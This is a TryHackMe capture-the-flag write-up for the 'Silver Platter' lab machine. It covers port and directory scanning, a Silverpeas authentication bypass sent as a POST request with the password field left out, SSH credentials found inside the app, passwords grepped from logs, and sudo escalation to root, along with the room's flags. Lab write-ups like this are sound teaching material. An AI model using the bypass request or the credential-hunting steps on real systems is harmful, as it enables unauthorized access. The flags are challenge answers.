# 🥈 Silver Platter - TryHackMe Writeup

---

## 📋 Room Information

| Detail | Value |
|--------|-------|
| **Platform** | TryHackMe |
| **Room Name** | Silver Platter |
| **Difficulty** | Medium |
| **Target IP** | `10.49.132.12` |

---

## 🔍 Phase 1: Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -p- 10.49.132.12
```

**Open Ports:**

| Port | Service | Description |
|------|---------|-------------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Web Server |
| 8080 | HTTP | Web Application |

---

## 🌐 Phase 2: Web Enumeration

### Port 80 - Directory Bruteforce

```bash
gobuster dir -u http://10.49.132.12 -w /usr/share/wordlists/dirb/common.txt
```

**Results:**
```
/assets               (Status: 301)
/images               (Status: 301)
/index.html           (Status: 200)
```

❌ Nothing interesting found on port 80.

---

### Port 8080 - Information Gathering

Browsing to `http://10.49.132.12:8080`, I found a website with a **Contact** section containing a valuable hint:

> *"If you'd like to get in touch with us, please reach out to our project manager on **Silverpeas**. His username is **scr1ptkiddy**."*

🎯 **Key Finding:** Application name is **Silverpeas**, username is **scr1ptkiddy**

---

### Discovering Silverpeas Login

Navigated to:
```
http://10.49.132.12:8080/silverpeas
```

This revealed a **Silverpeas login page**.

---

## 🔓 Phase 3: Exploiting Silverpeas (CVE-2024-36042)

### Vulnerability Research

Searching for Silverpeas vulnerabilities on GitHub, I found an **Authentication Bypass** vulnerability.

**Vulnerable Endpoint:** `/silverpeas/AuthenticationServlet`

### Exploitation with Burp Suite

1. **Intercept the login request** in Burp Suite
2. **Modify the POST request:**

```http
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.49.132.12:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

Login=scr1ptkiddy&DomainId=0
```

**Key:** Remove the `Password` parameter entirely and add `DomainId=0`

3. **Forward the request** → Successfully bypassed authentication! ✅

---

### Finding SSH Credentials

After logging in as **scr1ptkiddy**, I found a **notification** containing SSH credentials:

> *"Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes."*

| Field | Value |
|-------|-------|
| **Username** | `tim` |
| **Password** | `cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol` |

---

## 🖥️ Phase 4: Initial Access

### SSH Login as Tim

```bash
ssh tim@10.49.132.12
```

```bash
tim@ip-10-49-132-12:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

### User Flag 🚩

```bash
tim@ip-10-49-132-12:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```

---

## ⬆️ Phase 5: Privilege Escalation

### Tim → Tyler (Log File Analysis)

Tim is a member of the **adm** group, which grants access to **log files**.

```bash
tim@ip-10-49-132-12:~$ grep -r -i "password" /var/log 2>/dev/null
```

**Found in logs:**
```
tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/
```

🎯 **Tyler's Password:** `_Zd_zx7N823/`

---

### Switch to Tyler

```bash
tim@ip-10-49-132-12:~$ su tyler
Password: _Zd_zx7N823/
```

---

### Tyler → Root (Sudo Privileges)

```bash
tyler@ip-10-49-132-12:~$ sudo -l
```

```
User tyler may run the following commands on ip-10-49-132-12:
    (ALL : ALL) ALL
```

Tyler can run **any command as root**!

```bash
tyler@ip-10-49-132-12:~$ sudo su
root@ip-10-49-132-12:~# whoami
root
```

### Root Flag 🚩

```bash
root@ip-10-49-132-12:~# cat /root/root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
```

---

## 🗺️ Attack Path Summary

```mermaid
graph TD
    A[Nmap Scan] --> B[Port 8080 - Found Silverpeas hint]
    B --> C[/silverpeas login page]
    C --> D[Auth Bypass CVE - Burp Suite]
    D --> E[Login as scr1ptkiddy]
    E --> F[Found tim's SSH creds in notification]
    F --> G[SSH as tim - USER FLAG]
    G --> H[tim in adm group - read logs]
    H --> I[Found tyler's password in docker logs]
    I --> J[su tyler]
    J --> K[sudo -l → ALL privileges]
    K --> L[sudo su → ROOT FLAG]
```

---

## 🏆 Flags

| Flag | Value |
|------|-------|
| **User** | `THM{c4ca4238a0b923820dcc509a6f75849b}` |
| **Root** | `THM{098f6bcd4621d373cade4e832627b4f6}` |

---

## 📝 Key Takeaways

1. **OSINT matters** — Contact pages often leak usernames and application names
2. **Research vulnerabilities** — Silverpeas had a known auth bypass
3. **Group memberships** — The `adm` group provides log access
4. **Logs contain secrets** — Docker commands often expose passwords in environment variables
5. **Check sudo privileges** — `sudo -l` is essential for privilege escalation

---
